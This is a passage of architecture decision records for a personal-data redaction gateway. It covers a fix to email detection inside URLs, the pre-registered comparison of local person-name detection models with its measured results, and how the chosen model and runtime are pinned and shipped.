`http://…/login`, URL rule). `in-markup`: 90 messages, 98 placeholders, 32
restored (9 link texts, 9 table cells, 8 over-redacted lookalikes in
filler sentences, 6 emails in a plain URL: bug-log 49), 66 left: markdown
target 18, `[label]:` 9, HTML attribute 18, URL 21. Other shapes: 696
messages, 941 placeholders, 932 restored, 9 left (markdown target, all in
`joined-digits`, below). Held-out: 58 messages, 70 placeholders, 66
restored, 2 left in a quoted HTML attribute and 2 in a URL. Unclosed `<`,
unclosed `="`, host rule and bare-space: 0 in every part. Every message of
every part comes back exactly; no later-form message, none broken. The run
adds about 1 s.

**Found while measuring, not changed.**

- Bug-log 49: an email in a URL's query or path takes the URL's host and
  path with it, so the URL rule cannot see a URL in `https:[EMAIL_1]`. No
  leak; a detector change, waiting for a decision. **Fixed the same day
  by ADR-034** (`in-markup`: 26 restored, 27 left by the URL rule).
- Pseudonym's own bracket opens a markdown target. `1234567890(12345` is
  redacted as `[NUMBER_1]([NUMBER_2]` (ADR-029 J1 makes the joined digits a
  second detection), and the `](` between them is read as a link target,
  so `[NUMBER_2]` stays unrestored: 9 of the 30 `joined-digits` cases.
  After restoration there would be no link (the brackets go), so this is
  over-cautious; telling the model's own `](` from one Pseudonym's bracket
  made is a restoration-safety change and is not made here.
- The generated set has no unclosed `<` target or `="` value and no
  host-shaped placeholder, so the ADR-018 costs measure 0 on it; on text
  that has them they are not measured.

**Consequences.** `RestoreCounts`, `HELD_BACK_RULES`, `UnsafeRule` and
`UNSAFE_RULE_ORDER` are part of `src/redaction`'s exports, used by the
evaluation only. A change to a restoration rule now moves an eval count,
so it needs a baseline note when it holds back more. An echo is the best
case: a model that rewrites or drops placeholders is part 4.

---

<a id="adr-034"></a>

## ADR-034: An email's local part stops at "/", "=" and "?" (bug-log 49; amends the email rules of ADR-003 and ADR-029)

**Context.** The first echo measurement (ADR-033) showed that an email in
a URL's query or path was detected together with the URL around it: the
local part was read leftwards over every RFC 5322 local-part character,
and `/`, `=` and `?` are among them, so `https://support.example/track?id=<address>`
became `https:[EMAIL_1]`. Not a leak, but the model lost the URL, the URL
rule of restoration safety saw none (6 `in-markup` placeholders restored
outside it), and the eval's precision could not show it. 19 of the 40
`in-markup` emails were affected; none of the 153 main-set emails.

**Options.** (1) Stop the local part at `/` only: fixes paths, not
`?email=` or `id=`. (2) Stop it at `/`, `=` and `?` (the user's choice).
(3) Leave the detector, and teach the URL rule to look inside a
detection: restoration would then depend on detection spans.

**Decision.** (2). `LOCAL_CHAR` in `email.ts` is RFC 5322's set minus
`/`, `=` and `?`. **This is a deliberate fail-open trade:** the three are
legal in a local part, and an address that uses one (`a/b@example.com`)
is now redacted only from the character after the last of them; `a/` is
sent. Mail providers do not issue such addresses, while URLs and
`key=value` text with an address in them are common. The cost is pinned
by tests (`a/b`, `a=b`, `a?b` at example.com) and stated in the README's
known gaps and threat model.

**Measured first, on a copy of `src/` (2026-10-02).** Labelled emails lost:
0 of 153 (main) and 0 of 70 (shape block); all 223 detected exactly.
Every score count of both parts unchanged; main EMAIL recall 153/153 and
precision 153/153, before and after. Echo `in-markup`: restored 32 → 26,
left by the URL rule 21 → 27, everything else unchanged; main and other
shapes unchanged. Fuzz (200,000 texts of address-like pieces, seed 49):
246 detections differ, all in texts containing one of the three
characters, all covering less. In the repo after the change: held-out
unchanged; the two echo counts accepted with this ADR as the note (the
baseline reads fewer restored as worse, since it measures naturalness;
here the URL rule is now doing its job).

**Consequences.** `?`-, `=`- and `/`-joined text before an address is no
longer taken with it, so `user=priya@example.com` redacts only the
address. Mutations L1–L3 (each character put back) are caught by the URL
tests and the pinned cost.

---

<a id="adr-035"></a>

## ADR-035: Person names, Phase 6a — the comparison, the names dataset, and the stopping rule (written before any model run)

**Context.** Phase 6 detects person names with a model that runs on the
gateway's own machine (names never leave it, so no hosted API). No
candidate publishes numbers on Indian names in chat text, so the model is
chosen by measurement (6a) before any detector is built (6b). Baseline:
PERSON 0/153 on the generated set, 0/10 on the held-out set. Machine: Intel
i5-12450H, no GPU, 16 GB RAM with about 5 GB typically free, Windows 11,
Node 22.23.3, Ollama with `qwen3:4b-instruct-2507-q4_K_M`.

**Decided by the user (2026-10-03), before 6a:**

- **Candidates:** A `dslim/bert-base-NER` (English CoNLL-2003, MIT); B
  `Davlan/bert-base-multilingual-cased-ner-hrl` (10 languages, no Hindi,
  AFL-3.0); D `urchade/gliner_multi_pii-v1` (labels chosen at run time,
  Apache-2.0); E the local LLM through Ollama; F no model: name lists plus
  context cues. **C (`ai4bharat/IndicNER`) dropped:** no English training,
  our traffic is mostly English and Hinglish, romanised Hinglish is likely
  outside it too, and it publishes no ONNX weights (converting needs
  Python, which is not installed and will not be for this). It would only
  help Devanagari-script names; revisit only if 6a shows Devanagari is the
  main gap and nothing else covers it.
- **6a runtime, outside the repo** (`D:\pseudonym-6a`, not a project
  dependency): `onnxruntime-node` 1.30.0 (MIT) and `@huggingface/tokenizers`
  0.2.0 (Apache-2.0), installed exact. `@huggingface/transformers` was not
  used: it also pulls in `sharp` (images) and `onnxruntime-web`. Models
  pinned to a repository commit, the int8 `onnx/model_quantized.onnx` of
  each (A 109.0 MB from `Xenova/bert-base-NER@8e892123e8b7`; B 178.5 MB from
  `Xenova/bert-base-multilingual-cased-ner-hrl@263e82c06569`; D 349.1 MB
  from `onnx-community/gliner_multi_pii-v1@2e0397a7e8a2`), with a
  `SHA256SUMS` beside them.
- **Policies for 6b:** public figures are names and are redacted (the cost
  is documented; an allowlist is possible future work); confidence is
  tiered (option c, below); "Priya" and "Priya Sharma" are separate values
  with separate placeholders (no linking); when name detection is
  unavailable or too slow the request fails with 503, never forwarded with
  names in it.
- **Held-out gate:** about 20 more PERSON cases are being added to the
  held-out set (drafted and reviewed the same way as the rest) so that it
  holds about 30 PERSON values; with 10, one miss moves the number by 10
  points. **No 6a model run starts until the user says those cases are
  committed**, so the set stays blind.

**The names dataset (a dataset step, accepted with the detectors
unchanged, like ADR-021's shape block).** Today's generated PERSON values
come from 12 given names × 9 family names plus 5 fixed Devanagari names in
7 sentences, every one of which says it is a name. That cannot tell models
apart. A `shape:names` block is added at the end of the shape block (so
every earlier case renders exactly as before), one PERSON value per case,
tagged by language (`name-lang:`), script (`name-script:`), region of the
name (`name-region:`), form (`name-form:`) and place in the message
(`name-place:`), with name lookalikes (months, weekdays, places,
companies, products, festivals and deities, words that are also names,
Title Case labels, code identifiers) as labelled `NOT` slots beside them.

- **Name source: Wikidata (CC0).** The given names (P735) and family names
  (P734) of humans with Indian citizenship, counted by the state or union
  territory their place of birth lies in, grouped into five regions, plus
  the United States and the United Kingdom as a sixth, "international".
  English labels give the Latin spelling, Hindi labels the Devanagari one.
  The query, the date and the counts per region are in the generated file's
  header (`scripts/fetch-wikidata-names.ts` →
  `src/synthetic/wikidata-names.ts`). Only single names are stored; no
  person, and no pair of names, is ever written to a file.
- **Two disjoint halves.** Each name (by its lower-cased Latin spelling) is
  put in the `eval` half or the `gazetteer` half by a hash. The dataset
  draws only from `eval`; candidate F's name list is only `gazetteer`. So
  no candidate has seen the dataset's names in its own list, and F's
  recall on the names block measures its cues and capitalisation, not its
  list. Its list's effect is visible only on the held-out set and on the
  main cases, whose 12 × 9 names predate the split.
- **ADR-009 and real people.** Pairing a given and a family name at random
  can still produce the name of a real person: "Priya Sharma" is the name of
  many. This is accepted because the parts are common names (each among
  the most frequent in its region on Wikidata), the pairing is random and
  made in memory with no intent to name anyone, nothing else about a person
  is attached (every other value in a message is generated independently),
  and a common full name on its own identifies nobody. The pairs follow
  ADR-009 all the same: made in memory, never written to a file, never
  printed. Public figures are not planted at all (rule 4), so the cost of
  redacting their names is documented, not measured.

**The comparison (`scripts/compare-names.ts`, logic in `eval/names/`).**
Every candidate runs on every message of the generated set. Its spans are
widened to whole words (letters and combining marks) and scored with the
existing scorer (`eval/score.ts`) as PERSON detections on their own,
without `detect()`. Counts only: no text and no name is printed or stored.

**The stopping rule, fixed before any model run (2026-10-03).**

_Metrics_ (generated set only):

- **R**, the names-block recall: PERSON values in `shape:names` cases with
  every character inside a candidate detection, out of all of them.
- **Rows:** R per `name-lang:` (en, hinglish, hi) and per `name-script:`
  (latin, devanagari). A row with fewer than 50 values is reported, not
  judged. Region, form and place rows are reported, not judged.
- **FP:** candidate detections anywhere in the generated set that touch no
  labelled value and no `NOT` slot, per 1,000 words of the whole set
  (words = runs of non-space characters). Over-redactions of each lookalike
  kind are reported beside it, not judged (how many lookalikes there are
  is my choice).
- **Speed:** milliseconds per KiB of UTF-8 text, from the time to process
  256 KiB of generated messages (the body cap, ADR-015), joined into one
  text, after a warm-up run on its first 16 KiB. A candidate that needs
  more than the whole budget (15.4 s) for those 16 KiB is stopped there
  and recorded as over the limit.
- **Memory:** peak resident memory of the process minus its resident memory
  before the candidate loaded.

_Limits_, each a hard limit:

- **FP ≤ 1.0 per 1,000 words.**
- **Speed ≤ 60 ms per KiB:** a 256 KiB request in at most 15.4 s and a
  16 KiB chat history in about 1 s, on this machine, out of a 120 s
  provider timeout; the demo model itself took 2–21 s per answer (ADR-017).
- **Memory ≤ 1.5 GiB:** with about 5 GB free and the demo model loaded in
  Ollama beside it.

_Operating point._ A candidate with scores is tried at every point of a
fixed grid: `high` from 0.50 to 0.95 in steps of 0.05; `mid` either none or
from 0.10 to `high` − 0.05 in steps of 0.05. A span is kept if its score
is ≥ `high`, or ≥ `mid` with a cue nearby (option c). The cues are fixed
in `eval/names/cues.ts` before any run. A candidate's operating point is
the one with the highest R among those within the FP limit; ties go to the
lower FP, then the higher `high`. E and F have no scores: one point each.
E is too slow to run on the whole set (2–21 s per call, ADR-017): if it
fails the speed limit it is measured on the names block only, for the
record, and is not eligible.

_Decision._

1. **Eligible** = within all three limits at its operating point. The
   eligible candidate with the highest R is chosen; within 2 points of R,
   the faster one.
2. If its R is below 90% or a judged row is below 80%, the chosen
   candidate is combined with F (the union of their detections), and the
   combination replaces it if R goes up and it stays within the limits.
   If it is still below 60% (or no candidate is eligible), the
   combination of any other candidate with F that stays within the limits
   and has the highest R takes its place, if that R is 60% or more; it
   is then judged by steps 3 and 4. (Added 2026-10-03, before any run: a
   mutation check of the rule's code showed that with only the chosen
   candidate combined, an eligible combination of another candidate at
   60% or more fitted neither step 5 nor step 6.)
3. **Covered:** R ≥ 90% and every judged row ≥ 80%: ship, on by default.
4. **Partly covered:** R ≥ 60%: ship, on by default; the README gives R and
   the weakest rows and says plainly that names are only partly covered.
   60% is the lowest recall already shipped on the same terms (passport
   numbers, 93/153 = 60.7%, ADR-031). Off by default would protect nobody,
   and the costs are already within the limits.
5. **Too costly:** no eligible candidate or combination reaches R ≥ 60%,
   but one that fails a limit does (alone or combined with F): ship the
   one with the highest R behind `PSEUDONYM_NAMES`, **off by default**,
   with the limit it fails stated in the README. (Worded so on
   2026-10-03, before any run: the first wording, "no candidate is
   eligible", let an eligible candidate below 60% block this step.)
6. **Not shipped:** R < 60% everywhere. Phase 6 publishes the measurement,
   the README says names are not detected, and the next step is decided
   from the rows (IndicNER only if Devanagari is the main gap).

_Held-out:_ the configuration the rule chooses is run once on the held-out
set, PERSON row only, and reported. It is never tuned on and does not
change the decision. If its recall is more than 20 points below R, the
README says so beside both numbers (the generator, the cues and the
detector configuration share an author).

**Not measured in 6a.** Whether the model gives the same spans on Linux
(CI) as on Windows: the exact-count baselines (ADR-021) need it, and it is
checked in 6c, when CI first downloads the model.

**Consequences.** The rule and the cues are fixed by this entry; a change
to either after a model run needs its own note here saying what was seen
first. The dataset step changes the generated set (a changed dataset,
accepted with the detectors unchanged). Results are added to this ADR when
6a runs.

**Built (2026-10-03), still before any model run.**

- Name lists fetched 2026-10-02 (UTC): 160 given and 160 family names per
  region (north-east: 139 and 84), 19 to 68 of each with a Hindi label
  (international: 19 and 5); 610 spellings in `eval`, 607 in `gazetteer`,
  none in both. The all-India query and an all-UK-citizens query timed
  out, hence one query per state and cricketers for "international".
- The names block: 612 cases. Names in Devanagari in 75% of Hindi messages
  and 5% of the others; a Devanagari name is written in full, as a given
  name, in three parts or with an honorific (no initials, no letter case).
  Accepted with the detectors unchanged, together with the user's held-out
  commit 42d8be0 (held-out PERSON 10 → 45 values): names 0/612, none
  partly; 79 over-redactions in the block, all on its numeric lookalikes,
  none on a name lookalike.
- Adapters: BERT windows of 512 tokens, a core with up to 64 tokens of
  context on each side, a word's label from its first token, a name's score
  the mean of its words'. GLiNER as GLiNER.js, except that a word may hold
  combining marks (GLiNER.js's word regex has no `u` flag, so every
  Devanagari letter becomes a word of its own) and spans past the last word
  are masked out; windows of at most 384 words and 512 tokens, no overlap.
  E: one system prompt asking for a JSON array of the names as written,
  temperature 0, seed 20261003; its speed check is one call on 16 KiB,
  longer than Ollama's default context, so E's speed is a lower bound only.
- F's rules (`eval/names/gazetteer.ts`), fixed with the cues: a cue word
  is never part of a cue run, and a run is taken whole, a capitalised first
  word of a sentence included.
- Step 2 of the decision amended (above; bug-log 53). 42 of 42 mutations
  of `eval/names` caught.

**Results (2026-10-03; E incomplete, so the decision is provisional).**
Machine as above, Ollama 0.35.1, `qwen3:4b-instruct-2507-q4_K_M`. Run in
`D:\pseudonym-6a\runs\2026-10-03\`. E's handling of a refusal for length
was the user's option 1 (bug-log 55): E's speed is over the limit, and E
runs on the names block only. E then stopped after 92 of 612 messages on
an HTTP 500 from Ollama: its front end could not reach its own
llama-server to apply the chat template ("connection attempt failed",
02:23:43 IST). Not retried, as instructed. A, B, D and F are complete.

| Candidate | Point (high / mid)                             | R (names block) | Main PERSON | Precision | FP per 1,000 words | ms per KiB | Memory  | Fails           |
| --------- | ---------------------------------------------- | --------------- | ----------- | --------- | ------------------ | ---------- | ------- | --------------- |
| A         | 0.95 / 0.1                                     | 293/612 (47.8%) | 129/153     | 506/576   | 0.99               | 416.0      | 245 MiB | speed           |
| B         | 0.9 / 0.6                                      | 383/612 (62.5%) | 138/153     | 564/617   | 0.96               | 285.0      | 325 MiB | speed           |
| D         | port unverified, results excluded (bug-log 56) |                 |             |           |                    |            |         |                 |
| F         | (no score)                                     | 420/612 (68.6%) | 109/153     | 557/790   | 4.98               | 1.0        | 30 MiB  | false positives |
| A+F       | 0.95 / 0.1                                     | 468/612 (76.4%) | 142/153     | 646/932   | 5.67               | 417.0      | 245 MiB | both            |
| B+F       | 0.9 / 0.6                                      | 501/612 (81.8%) | 145/153     | 661/933   | 5.85               | 286.0      | 325 MiB | both            |
| D+F       | port unverified, results excluded (bug-log 56) |                 |             |           |                    |            |         |                 |

> **Relabelled 2026-10-07 (Phase 6c, by ADR-036's pre-registered rule):
> every figure in this table was measured on an Intel Core i5-12450H.**
> B+F's row is reproduced exactly on that CPU under Debian 12 and on a
> GitHub runner's AMD EPYC 7763. On another runner's Intel Xeon Platinum
> 8573C, B+F at 0.9 / 0.6 gave 502/612 (82.0%), main 145/153, precision
> 662/934, 5.85 per 1,000 words: one more detection, a correct name
> (ADR-036, "Result, the GitHub runners"). The held-out 41 of 45 below is
> the i5-12450H's and is not re-run on any other CPU. The table itself is
> left as it was measured.

Judged rows (language, script), R: A en 62.6, hinglish 49.7, hi 9.6,
latin 59.0, devanagari 1.6; B 63.3, 62.0, 61.6, 60.8, 69.7; D excluded; F 66.6, 67.9, 74.4, 66.1, 78.9; B+F 81.0, 79.1,
88.0, 79.1, 93.2. Other rows are in the run's output. All-lower-case
names are found by almost nothing (A 0/59, B 3/59, F 0/59; D 27/59).

**The rule applied as written, without E: "too costly", B+F at 0.9 / 0.6
(R 81.8%), off by default behind `PSEUDONYM_NAMES`**; it fails the
false-positive limit (5.85) and the speed limit (286 ms per KiB). Every
candidate fails a limit, E included (its speed is over by definition), so
the tier cannot change when E completes. Only the configuration can: E or
E+F replaces B+F if its R is above 81.8%.

**Not trusted yet: D.** It finds 1 of 109 names in the middle of a
sentence and 56 of the 153 main-case names, which all follow "My name is"
or similar. That pattern looks more like a fault in my port of GLiNER
(`eval/names/gliner.ts`, never checked against a reference output, since
Python is not installed) than like the model. D's numbers describe the
port as built, not GLiNER.

**Tokens per KiB (asked for by the user after the first run).** Text
tokens per KiB of the generated messages; fed = what the model is given
for the 256 KiB speed text (window context, prompt and special tokens
included):

| Candidate | Latin messages                                 | Devanagari messages | All | Fed | ms per KiB | ms per fed token |
| --------- | ---------------------------------------------- | ------------------- | --- | --- | ---------- | ---------------- |
| A         | 402                                            | 294                 | 371 | 489 | 416.0      | 0.85             |
| B         | 368                                            | 262                 | 338 | 445 | 285.0      | 0.64             |
| D         | port unverified, results excluded (bug-log 56) |                     |     |     |            |                  |

Devanagari is not the costly part: per KiB, every model reads fewer
tokens in Devanagari messages than in Latin ones (a Devanagari character
is 3 bytes of UTF-8). A is fed 10% more tokens than B, which explains a
small part of its higher ms per KiB, not the 46%. Its later latency runs
do not repeat the gap: at 64 KiB A took 304 ms per KiB and B 284, and A
was faster than B at 1, 4 and 16 KiB. A's 416 is most likely a first-run
effect (A ran first; its 16 KiB warm-up took 14 s, B's 5 s). What the
comparison shows: A and B, the same 12-layer encoder, cost about the same
per KiB; one 256 KiB run per candidate cannot rank them on speed. It does
not change eligibility: both are more than 4.5 times over.

**Latency per request (asked for by the user after the first run).**
Median of 5 runs (E and Ollama: 3), each on a different stretch of text:

|                                         | 1 KiB                                          | 4 KiB     | 16 KiB            | 64 KiB            |
| --------------------------------------- | ---------------------------------------------- | --------- | ----------------- | ----------------- |
| A                                       | 80 ms                                          | 621 ms    | 4,349 ms          | 19,435 ms         |
| B                                       | 138 ms                                         | 1,102 ms  | 4,563 ms          | 18,195 ms         |
| D                                       | port unverified, results excluded (bug-log 56) |           |                   |                   |
| F                                       | 2 ms                                           | 4 ms      | 17 ms             | 63 ms             |
| E                                       | 18,198 ms                                      | 81,284 ms | refused (context) | refused (context) |
| Ollama, first token of a support answer | 15,835 ms                                      | 66,934 ms | refused (context) | refused (context) |

Event loop blocked up to 161–208 ms at a time by A and B (onnxruntime
calls on the main thread).

> **Corrected by measurement (2026-10-07, ADR-036 "Step 4b").** These are
> the longest event-loop delays measured while A and B ran, not delays
> shown to be caused by inference: with B moved to a worker thread the
> longest delay was 94–129 ms, in the same range. The runtime runs
> inference on its own threads.

**Note written AFTER seeing the 6a results (2026-10-03). Not part of the
pre-registered rule and not a change to it.** Everything above this note
under "The stopping rule" was fixed before any model ran; this note was
written once the tables above existed, at the user's request, so that the
user can decide with both measures in view. Until the user decides and a
separate dated amendment says otherwise, the decision is the one the rule
as written gives.

_What was observed._ Every model is 4.7 to 6.9 times over the 60 ms per
KiB limit, measured on 256 KiB. At the sizes chat requests usually have,
the same models add, in absolute terms: at 1 KiB, A 80 ms, B 138 ms;
at 4 KiB, A 621 ms, B 1,102 ms (D excluded, bug-log 56). On the same machine
the demo model's own time to first token was 15.8 s at 1 KiB and 66.9 s
at 4 KiB, so B would add about 0.9% and 1.6% to it. From 16 KiB on,
Ollama refuses the request at its default 4,096-token context.

_Why a flat ms-per-KiB limit may be the wrong shape for chat-sized
requests._

- It judges every size by the cost of the largest. The question the limit
  stands for is whether name detection makes answers noticeably slower,
  and that depends on the absolute delay at the sizes requests really
  have, next to what the provider itself takes.
- Cost per KiB is not constant at small sizes: at 1 KiB every model was
  cheaper per KiB (A 80, B 138 ms) than at 64 KiB (A 304, B 284). From
  4 KiB on, B is close to flat; A rose until 64 KiB.
  So the shape argument rests mainly on the first point, not on
  non-linearity.
- 60 ms per KiB was chosen so that a 256 KiB request takes at most 15.4 s
  and a 16 KiB history about 1 s. Those are reasonable targets, but no
  measurement chose them.

_Why it may still be the right shape, or part of one._

- The comparison above is with a 4-billion-parameter model on this CPU.
  A hosted provider usually starts answering in well under a second (not
  measured here); next to that, 1.1 s at 4 KiB is not small.
- Requests grow during a conversation: the client resends the whole
  history each turn (stateless design), so 16 to 64 KiB is reachable, and
  B took 4.6 s and 18.2 s there.
- The worst case still matters: at 285 ms per KiB a request at the 256 KiB
  body cap would take about 73 s, more than half of the 120 s provider
  timeout.
- The event loop is blocked for up to 208 ms per call whatever the size,
  which affects every concurrent request until inference moves to a
  worker thread.

  > **Contradicted by measurement (2026-10-07, ADR-036 "Step 4b").** Moving
  > inference to a worker thread did not reduce the longest event-loop
  > delay (94–129 ms with the thread, 126 ms in-process the same day). The
  > thread was kept for module isolation and a clean boundary for the
  > queue and the timeout, not for the event loop.

_Possible shapes, for the user to decide (none adopted):_ an absolute
limit on added latency at a reference size (for example the median at
4 KiB); a limit relative to the provider's time to first token measured
on the same machine; or two limits, one at chat size and one for the
body-cap case within the provider timeout. Any of them is a change to
ADR-035 made after the results were known, and would have to say so.

**Decisions after the results (the user, 2026-10-03).**

- **E did not complete, and is not re-run.** Its first run was refused by
  Ollama for length (bug-log 55); after the fix it stopped at 92 of 612
  names-block messages on an HTTP 500 inside Ollama (its front end could
  not reach its own llama-server). E cannot ship whatever it scores (its
  speed is over the limit by definition). **No recall is published from
  the 92 messages:** they are the first 92 in a fixed order, not a random
  sample.
- **D: port unverified, results excluded.** The check the user set: run
  the port on the example GLiNER's model card publishes with expected
  output (`urchade/gliner_multi_pii-v1@1fcf13e85f4e`, 14 labels, 6
  entities), at the card's threshold (0.5, flat). The port, with the int8
  model D was measured with, found none of the six and nothing else
  (`--gliner-card`; bug-log 56). D's numbers above describe that port,
  not GLiNER, and are not published. Whether the fault is in the port or
  in the int8 export was not tested: full precision is a 1.1 GB download
  and could not rescue the int8 numbers.
- **The verdict is accepted as written; the rule is not changed.**
  Scored again without D (A, B, F and their combinations): the same
  decision, **too costly, B+F at high 0.9 / mid 0.6, R 501/612 (81.8%),
  off by default behind `PSEUDONYM_NAMES`**. The user's reasons: the rule
  was pre-registered, and B+F fails the false-positive limit on its own,
  by 5.85 times (5.85 per 1,000 words, about one wrongly redacted word in
  every 170), whatever is decided about speed.
- **Observed after the measurement, not before:** B alone meets both
  accuracy requirements (R 62.5% ≥ 60%, 0.96 false positives per 1,000
  words ≤ 1.0) and fails only the speed limit (285 ms per KiB), adding
  about 138 ms at 1 KiB and 1.1 s at 4 KiB against the demo model's
  15.8 s and 66.9 s to first token. A future revision that used an
  absolute added-latency budget instead of a flat ms-per-KiB rate would
  likely allow B on by default. Recorded so; not adopted.
- **Still to run (pre-registered):** the held-out set, once, on B+F at
  0.9 / 0.6, PERSON row only.

**Held-out result (2026-10-03, run once, as pre-registered).** B+F at
high 0.9 / mid 0.6 (`--held-out B+F --point 0.9/0.6`), PERSON row only:
**41/45 (91.1%) redacted, precision 41/46 (89.1%)**. Wilson 95%
intervals: held-out 79.3–96.5%, generated names block (501/612) 78.6–84.7%;
they overlap, so the held-out figure is consistent with the generated one,
not shown to be higher. The 20-point warning in the rule does not apply.
The user expected it to come out well below 81.8%; it did not, and it is
reported as measured. One reason known without reading the held-out file:
by design F's name list cannot match any generated name (disjoint halves),
while real names in the held-out set can be on it. Which held-out cases
were found was not looked at. The README gives this figure the same
prominence as the generated one, and calls it the one to quote.

---

**Note (2026-10-07, Phase 6b step 4b): re-running this comparison today
does not reproduce the table above.** The generated set has grown by 204
messages since this run (two shapes added later, with no PERSON values),
and `scripts/compare-names.ts` scores the whole set, so the rule then
picks B at 0.95 / 0.1 (B+F 495/612, 5.53 per 1,000 words; the decision is
the same). The spans on the 1,998 messages measured here are unchanged
(ADR-036, "Step 4b"). The published figures describe those 1,998
messages; `npm run eval:names` pins them by hash and reproduces every
figure of the B+F row through the gateway.

<a id="adr-036"></a>

## ADR-036: Person names, Phase 6b — how the runtime, the model and the name list reach a machine (2026-10-03; accepted)

**Status.** **Accepted by the user (2026-10-03): (a) option 1, native
`onnxruntime-node` as an exact optional dependency; (b) option 3 as
written.** (b) was approved first, with three additions written into it
(what happens when the pinned URL stops resolving, the model's licence,
the name list as a second distributed artifact); (a) after option 5, a
WebAssembly runtime, was priced. Accepted with it: "What the held-out
measurement froze", the exact runtime pin and its bump procedure, and
the install-skip assumption with its fallback (below). The three rules
under "Already decided" and the constraint on step 3 are settled.
**Amended 2026-10-06:** the CI runner's OS label is pinned beside the
other pins, with what that does and does not fix. **Built 2026-10-07
(step 4a):** the two packages as exact optional dependencies, the download
script, the load-time check; every figure measured then is in "Step 4a:
installed and measured", at the end of this ADR, and replaces the
registry figures below where they differ. **Built 2026-10-07 (step 4b):**
the worker thread, B's code moved from the comparison script, and the
proof that the gateway reproduces 6a's span SHA-256s exactly; "Step 4b",
at the end of this ADR, with the gateway's measured speed and memory
(which replace the 325 MiB note for the gateway). **Final summary
of this ADR, and what it leaves for Phase 6c:** "Where this ADR stands at
the end of Phase 6b", its last section.

**Context.** ADR-035 ships B+F (B =
`Xenova/bert-base-multilingual-cased-ner-hrl@263e82c06569`, int8, at high
0.9 / mid 0.6) behind `PSEUDONYM_NAMES`, **off by default**: it fails the
false-positive limit (5.85 per 1,000 words against 1.0) and the speed limit
(286 ms per KiB against 60). So most people running the gateway will run it
with names off, and must not pay for, or be broken by, what names need. B
needs a runtime that is not a project dependency today (`onnxruntime-node`
1.30.0 and `@huggingface/tokenizers` 0.2.0, in `D:\pseudonym-6a` for 6a;
both still the newest on the registry, read 2026-10-03) and four files:
`onnx/model_quantized.onnx`, `tokenizer.json`, `tokenizer_config.json` and
`config.json` (its `id2label` gives the order of the output columns).

**What is known about install cost, without installing (read 2026-10-03).**

- From the registry (`npm view <pkg>@<version> dist.unpackedSize`):
  `onnxruntime-node` 1.30.0: 301,068,136 bytes unpacked, 43 files;
  `onnxruntime-common` 1.30.0 (its dependency): 574,567 bytes;
  `@huggingface/tokenizers` 0.2.0: 360,962 bytes, no dependencies and no
  install script. `onnxruntime-node` also depends on `adm-zip` and
  `global-agent` (sizes not read).
- `onnxruntime-node` bundles native binaries for win32, darwin and linux
  (x64 and arm64; listed in the 6a copy's `bin/napi-v6/`), and has a
  `postinstall` script (`script/install.js`) that **fetches more native
  binaries during install**: on linux/x64 its metadata requires `cuda12`,
  so by default it downloads the CUDA 12 provider libraries from NuGet
  (`Microsoft.ML.OnnxRuntime.Gpu.Linux`); on win32/x64 it fetches nothing.
  It can be told to skip with `--onnxruntime-node-install=skip` or
  `ONNXRUNTIME_NODE_INSTALL=skip`; the CPU runtime is in the package
  either way. GitHub's `ubuntu-latest` runner, and a typical Docker image,
  are linux/x64. **The real on-disk and download figures are measured in
  step 4, on a clean install, not guessed here.** (Measured on Windows in
  step 4a, below; "x64 and arm64" is wrong for darwin, which has arm64
  only. Linux is still unmeasured.)
- The model file is 178,495,423 bytes (B in `D:\pseudonym-6a`, recorded in
  ADR-035 as 178.5 MB); `tokenizer.json` is 2,919,362 bytes.
- GitHub's documentation (read 2026-10-03): files over 100 MiB are
  blocked, with a warning from 50 MiB; Git LFS on GitHub Free includes
  10 GiB of storage and 10 GiB of bandwidth a month, and downloads by
  GitHub Actions, forks and clones count against the repository owner's
  bandwidth.

### What the held-out measurement froze

The held-out figure for names, **41 of 45 (B+F at high 0.9 / mid 0.6, run
once on 2026-10-03, ADR-035)**, describes four inputs together, and only
together:

1. **The runtime:** `onnxruntime-node` 1.30.0, native, its default CPU
   execution provider.
2. **The tokenizer:** `@huggingface/tokenizers` 0.2.0, which turned each
   word into the token ids the model was given; another version that
   splits a word differently changes what the model sees.
3. **The model bytes:** the four files of
   `Xenova/bert-base-multilingual-cased-ner-hrl` at commit
   `263e82c06569c8c2ac46238a7ae5107598934234`, by their SHA-256 values
   (recorded with the 6a runtime; `model_quantized.onnx`
   `5b65139844be260b624a2a13782b01d122e613d64ce16ed0ba4d82e0b816f1a9`).
4. **The name list:** the 718-string `gazetteer` half of
   `src/synthetic/wikidata-names.ts`, canonical SHA-256
   `313b89ea3a88ba35265f8f8bf5d2022c8dd85e90cdff4744bc3bb388821f3951`.

> **Two more frozen inputs, added 2026-10-07 (Phase 6c).** 5. **The
> operating point**, 0.9 / 0.6 (`MODEL_POINT`), held fixed by the move
> standard all along and named here so the list is whole. 6. **The CPU,
> by model: measured on an Intel Core i5-12450H.** With every other input
> the same, the spans were identical on the i5-12450H (Windows 11 and
> Debian 12, 12 or 4 threads) and on a GitHub runner's AMD EPYC 7763, and
> slightly different on another runner's Intel Xeon Platinum 8573C
> ("Result, the GitHub runners", below). So the generated set's 81.8% and
> 5.85 describe the CPU models they were measured or reproduced on, the
> operating system has been shown not to matter, and 41 of 45 is the
> i5-12450H's. The held-out figure is not re-run on any other CPU.

**Changing any one of these inputs orphans the figure**: it then describes
code that no longer ships. The held-out set is spent for names (run once,
reporting only), so a figure orphaned this way **cannot be re-earned**;
it can only be re-labelled as describing the configuration it was
measured on. The generated set can be re-run at any time, so its numbers
can always be brought up to date; the held-out number cannot.

What keeps the four fixed: the runtime and the tokenizer by exact
version pins with the lockfile's integrity hashes and a bump procedure
(in (a), below); the model by its SHA-256 values, checked at download and
at load (in (b)); the list by its canonical SHA-256, checked by a test
(`test/unit/detection/names/join.test.ts`) and at start-up (in (b)). The
code that turns them into spans (the moved logic in
`src/detection/names/`, the B+F join, the point 0.9 / 0.6) is held fixed
by the move standard: span SHA-256s and every metric identical before and
after each move. Not covered by any of this: the platform. The figure was
measured on Windows x64; whether Linux reproduces the same spans is the
open question ADR-035 left for 6c.

**Two implementations of the join, and why one stays frozen.** The B+F
join exists twice. The gateway's is `joinDetections` in
`src/detection/names/join.ts` (moved from `combine`, below). The other is
the inline union in `scripts/compare-names.ts`'s held-out branch,
`merge(finds.flatMap((f) => f(text)))`, which produced the 41 of 45. That
branch is not moved and not edited: it ran once, it cannot be re-run to
prove that an edited version gives the same answer, and the gateway has no
notion of a held-out set. The figure therefore depends on the two being
equivalent as much as on the four inputs. **Checked 2026-10-03 (D0), with
no held-out content:** both run on the generated set's inputs (the saved B
and F spans of the `2026-10-03-join-after` comparison, through a verbatim
